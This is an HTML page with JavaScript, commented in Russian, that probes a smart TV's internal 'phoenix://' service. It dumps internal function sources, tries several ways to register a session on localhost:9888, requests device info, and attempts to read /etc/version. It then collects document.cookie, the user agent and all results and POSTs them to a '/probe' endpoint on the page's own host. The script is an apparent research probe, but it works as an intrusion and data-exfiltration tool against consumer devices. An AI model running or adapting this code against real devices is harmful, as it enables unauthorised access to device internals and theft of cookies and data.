<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>tv phoenix register</title>
<style>
 body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
 h1{font-size:18px;margin:0 0 8px}
 #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
 .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
</style>
</head>
<body>
<h1>phoenix:// регистрация сессии <small class="dim">read-only</small></h1>
<div id="log"></div>
<script>
/* Служба говорит на phoenix://service/<name>:
   {path, method:"callAPI", parameters:{api}, session, timeout, identifier}
   GET / -> "service register failed". Пробуем штатно зарегистрироваться,
   затем повторить fileRead и позвать tvinfo/initialData. Только чтение. */
var API = "", out = { sources: {}, register: [], tvinfo: [], fileread: [], cookies: null };

function log(m, c) {
  var el = document.getElementById("log"), d = document.createElement("div");
  if (c) d.className = c;
  d.textContent = String(m).slice(0, 400); el.appendChild(d);
}
function post(p, o, cb) {
  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
}
function req(method, url, body, cb) {
  try {
    var x = new XMLHttpRequest();
    x.open(method, url, true);
    x.withCredentials = true;
    x.timeout = 5000;
    x.setRequestHeader("Content-Type", "application/json");
    x.onload = function () { cb({ status: x.status, text: String(x.responseText || "").slice(0, 3000) }); };
    x.onerror = function () { cb({ status: null, error: "onerror" }); };
    x.ontimeout = function () { cb({ status: null, error: "timeout" }); };
    x.send(body ? JSON.stringify(body) : null);
  } catch (e) { cb({ status: null, error: String(e) }); }
}
function src(obj, name) {
  try { return Function.prototype.toString.call(obj[name]); } catch (e) { return "err:" + e; }
}

/* ---------- 1. исходники протокола ---------- */
var S = window.vowOS.service;
["syncExecute","execute","executeHttpRequest","processResponse","getIdentifier","reLaunchService","socketonopen","socketonmessage"].forEach(function (n) {
  out.sources[n] = String(src(S, n)).slice(0, 1200);
});
log("исходники сняты", "dim");

/* ---------- 2. регистрация сессии ---------- */
var MSG = { path: "phoenix://service/tvinfo", method: "callAPI", parameters: { api: "initialData" }, session: 0, timeout: 2, identifier: "" };
var FORMS = [
  { name: "POST / body=msg", m: "POST", u: "https://localhost:9888/", b: MSG },
  { name: "POST / body=[msg]", m: "POST", u: "https://localhost:9888/", b: [MSG] },
  { name: "POST / body={msgs:[msg]}", m: "POST", u: "https://localhost:9888/", b: { msgs: [MSG] } },
  { name: "POST /service/register", m: "POST", u: "https://localhost:9888/service/register", b: MSG },
  { name: "POST /register", m: "POST", u: "https://localhost:9888/register", b: MSG }
];
var fi = 0;
function regNext() {
  if (fi >= FORMS.length) { tvinfoStage(); return; }
  var f = FORMS[fi++];
  req(f.m, f.u, f.b, function (r) {
    out.register.push({ form: f.name, res: r });
    var good = r.status === 200 && String(r.text).indexOf("register failed") < 0;
    log((good ? "OK   " : "     ") + f.name + " -> " + (r.status || r.error) + " " + String(r.text || "").slice(0, 160), good ? "hit" : "dim");
    setTimeout(regNext, 80);
  });
}

/* ---------- 3. tvinfo initialData ---------- */
function tvinfoStage() {
  var calls = [
    ["syncExecute tvinfo/initialData", function () { return window.vowOS.service.syncExecute("tvinfo", { api: "initialData" }); }],
    ["HiUtils tvinfo/initialData", function () { return window.HiUtils_createRequest("tvinfo", { api: "initialData" }); }],
    ["GET tvinfo initialData", null]
  ];
  for (var i = 0; i < 2; i++) {
    try {
      var r = calls[i][1]();
      var s = JSON.stringify(r);
      out.tvinfo.push({ name: calls[i][0], result: String(s).slice(0, 2000), bytes: String(s).length });
      log(calls[i][0] + " -> " + String(s).slice(0, 200), "dim");
    } catch (e) { out.tvinfo.push({ name: calls[i][0], error: String(e) }); }
  }
  var url = "https://localhost:9888/service/tvinfo?api=initialData&args=%22%22";
  req("GET", url, null, function (r) {
    out.tvinfo.push({ name: "GET tvinfo?api=initialData", result: r });
    log("GET initialData -> " + (r.status || r.error) + " " + String(r.text || "").slice(0, 200), "dim");
    filereadStage();
  });
}

/* ---------- 4. fileRead после регистрации ---------- */
function filereadStage() {
  var tries = [
    ["plain", { path: "/etc/version" }],
    ["identifier", { path: "/etc/version", identifier: "" }],
    ["session0", { path: "/etc/version", session: 0 }]
  ];
  for (var i = 0; i < tries.length; i++) {
    var r = null;
    try { r = window.HiUtils_createRequest("fileRead", tries[i][1]); } catch (e) { r = { thrown: String(e) }; }
    out.fileread.push({ form: tries[i][0], result: JSON.stringify(r).slice(0, 300) });
    log("fileRead " + tries[i][0] + " -> " + JSON.stringify(r).slice(0, 200), "dim");
  }
  finish();
}

function finish() {
  try { out.cookies = document.cookie; } catch (e) {}
  out.userAgent = navigator.userAgent;
  post("/probe", Object.assign({ name: "phoenix" }, out), function (st) {
    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
  });
}
regNext();
</script>
</body>
</html>
